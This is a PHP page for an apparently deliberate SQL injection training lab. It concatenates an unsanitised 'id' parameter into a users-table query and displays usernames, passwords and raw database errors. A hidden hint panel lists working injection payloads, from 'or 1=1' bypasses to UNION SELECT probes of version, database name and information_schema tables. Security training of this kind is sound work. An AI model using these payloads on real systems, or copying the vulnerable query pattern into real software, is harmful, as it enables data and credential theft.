<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab1</title>
    <style>
            .container {
            position: relative;
            max-width: 100%; /* Maximum width */
            margin: 0 auto; /* Center it */
            }

            .container .content {
            position: absolute; /* Position the background text */
            bottom: 0; /* At the bottom. Use top:0 to append it to the top */
            background: rgb(0, 0, 0); /* Fallback color */
            background: rgba(0, 0, 0, 0.7); /* Black background with 0.5 opacity */
            color: #f1f1f1; /* Grey text */
            width: 100%; /* Full width */
            height: 100%;
            }
            a {
                    text-decoration:none;
                }
            .btn {
                    background-color:white; 
                    border: none;
                    color: black;
                    padding: 10px 12px;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 10px;
                    box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
                    border-radius: 12px;
                }
    </style>
</head>
<body >
    <div class="container">
            <img src="../../img/lab1.jpg" style="width:100%;">
                <div class="content">
                <h1><p style="color:red;font-weight: bold; text-align: center">Retrieving hidden data <span style="color:yellow">FSC Project</span> <i></i></p></h1>


                    <?php
                    //including the Mysql connect parameters.
                    include("../sql_connections/sql_connect.php");

                    // take the variables
                    if(isset($_GET['id']))
                    {
                    $id=$_GET['id'];
                    //logging the connection parameters to a file for analysis.
                    $fp=fopen('result.txt','a');
                    fwrite($fp,'ID:'.$id."\n");
                    fclose($fp);

                    // connectivity 

                    $id = '"' . $id . '"';
                    $sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
                    //1) or 1=1 --
                            try {

                                $result=mysqli_query($con, $sql);
                                $row = mysqli_fetch_array($result, MYSQLI_BOTH);
                                echo "<p style='font-size:30px; color:#99FF00;text-align: center;'>";
                                echo 'Your Login name:'. $row['username'];
                                echo "<br>";
                                echo 'Your Password:' .$row['password'];
                                echo "</p>";

                            }catch (Exception $e) {
                                echo '<p style="color:#FFFF00;font-size: 30px;">';
                                print_r(mysqli_error($con));
                                echo "</p>"; 

                            }



                    }
                    else { 
                        echo "Please input the ID as parameter with numeric value";
                    }

                    ?>
                    <div style="position: absolute;left: 500px;bottom: 450px;">
                        <button onclick="myFunction()" class="btn">HINT</button>

                            <div id="myDIV" style="display:none;background-color:blue;color: black;">
                            
                            1") or ("1")=("1 Will work nicely.   id = (" ")or ("1")=("1 ") LIMIT 0,1 <br>
                            1") or 1=1 --+ Will also work.   id = (" ")or 1=1 --+  ") commented out <br>
                            1") or 1=1 # will also work.       id = (" ") or 1=1 #  ") commented out <br>
                            -1") union select 1,2,3 --+ <br>
                            -1") union select 1,2,version() --+ <br>
                            -1") union select 1,database(),version() --+ <br>
                            -1") union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ <br>
                            
                            </div>
                    </div>
                </div>
        </div>

        
    <script>
        function myFunction() {
            var x = document.getElementById("myDIV");
            if (x.style.display === "none") {
                x.style.display = "block";
            } else {
                x.style.display = "none";
            }
            }
    </script>
</body>
</html>